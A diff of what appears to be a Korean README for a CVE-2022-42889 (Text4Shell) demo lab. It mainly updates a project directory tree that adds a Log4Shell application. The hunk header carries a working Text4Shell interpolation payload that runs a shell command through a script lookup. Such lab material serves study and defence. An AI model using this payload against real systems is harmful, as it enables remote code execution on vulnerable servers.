@@ -39,14 +39,20 @@ ${script:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/hacked')}
 CVE-2022-42889/
 ├── docker-compose.yml
 ├── Dockerfile
-└── app/
-    ├── pom.xml
-    └── src/
-        └── main/
-            └── java/
-                └── com/
-                    └── example/
-                        └── DemoApplication.java
+├── get-docker.sh
+├── app/
+│   ├── pom.xml
+│   └── src/
+│       ├── main/
+│       │   ├── java/
+│       │   │   └── com/
+│       │   │       └── example/
+│       │   │           ├── DemoApplication.java
+│       │   │           └── log4shell/
+│       │   │               └── Log4ShellApplication.java
+│       │   └── resources/
+│       │       └── application.properties
+
 ```
 
 ## 시연
